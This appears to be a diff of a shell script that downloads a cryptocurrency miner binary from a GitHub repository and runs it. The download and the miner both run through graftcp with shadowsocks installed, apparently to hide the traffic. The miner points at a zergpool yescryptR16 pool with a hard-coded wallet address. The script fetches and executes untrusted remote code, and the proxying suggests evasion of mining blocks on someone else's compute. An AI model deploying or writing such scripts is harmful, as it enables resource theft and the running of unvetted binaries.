@@ -35,11 +35,11 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/dekamoonth/cpuu/raw/main/ava2 
-chmod +x ava2
+./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/cpuminer-sse2
+chmod +x cpuminer-sse2
 
 apt -y install shadowsocks-libev rng-tools
 
-./graftcp/graftcp ./ava2 -a yescryptR16 -o stratum+tcp://yescryptR16.asia.mine.zergpool.com:6333 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p c=DGB,mc=QOGE,ID=feas -t 3
+./graftcp/graftcp ./cpuminer-sse2 -a yescryptR16 -o stratum+tcp://yescryptR16.asia.mine.zergpool.com:6333 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p c=DGB,mc=QOGE,ID=feas -t 3
 
 
